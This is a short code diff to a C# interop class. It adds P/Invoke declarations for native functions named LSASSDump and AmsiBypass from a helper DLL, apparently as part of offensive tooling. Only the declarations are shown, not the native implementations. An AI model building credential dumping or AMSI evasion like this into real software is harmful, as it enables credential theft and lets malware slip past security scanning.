@@ -33,5 +33,12 @@ public class NativeMethods
 
     [DllImport("CppHelp.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.Cdecl)]
     public static extern int CreateNewProcess(string appname, string cmdline);
+
+    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
+    public static extern int LSASSDump();
+
+    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
+    public static extern int AmsiBypass();
+
 }
 
